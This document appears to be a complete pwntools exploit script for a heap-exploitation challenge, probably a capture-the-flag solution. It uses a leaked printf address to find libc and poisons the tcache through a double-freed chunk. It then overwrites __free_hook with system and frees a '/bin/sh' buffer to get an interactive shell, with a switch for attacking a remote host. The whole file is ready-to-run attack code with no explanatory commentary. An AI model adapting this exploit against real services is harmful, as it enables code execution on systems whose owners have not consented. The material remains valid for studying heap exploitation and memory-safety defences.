from pwn import * 

context.arch="x86_64"

def add_book(p, size, content):

    p.sendlineafter("option: ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Content: ", content)

def remove_book(p, index):

    p.sendlineafter("option: ", "3")
    p.sendlineafter("index: ", str(index))


def main():

    global libc 
    libc = ELF("../libc.so.6")
    HOST = ""
    PORT = 0
    local = True 

    if local:

        p = process("../chall")

    else:

        p = remote(HOST, PORT)

    #getting libc address 
    p.recvuntil("leak: ")
    libc_leak = p.recvline().rstrip()
    libc_leak = int(libc_leak, 16)
    log.info(f"Printf at libc: {hex(libc_leak)}")
    libc_base = libc_leak - 0x3d830
    libc.address = libc_base 
    log.info(f"Libc base: {hex(libc_base)}")

    free_hook = libc_base + 0x1c25a8
    log.info(f"Free hook at: {hex(free_hook)}")
    
    system = libc_base + 0x2dfd0
    log.info(f"system at: {hex(system)}")
    
    add_book(p, 0x58, b'A' * 0x58) #0
    add_book(p, 0x180, b'B' * 0x180) #1

    remove_book(p, 0)
    remove_book(p, 1)
    
    add_book(p, 0x58, b'/bin/sh\x00' + b'A' * 0x50) #0

    remove_book(p, 1)

    log.info("Tcache poisonning...")
    add_book(p, 0x180, p64(free_hook))
    add_book(p, 0x80, b'M' * 0x80)
    add_book(p, 0x80, p64(system))

    log.info("Getting a shell...")
    remove_book(p, 0)
    p.interactive()


if __name__ == "__main__":

    main()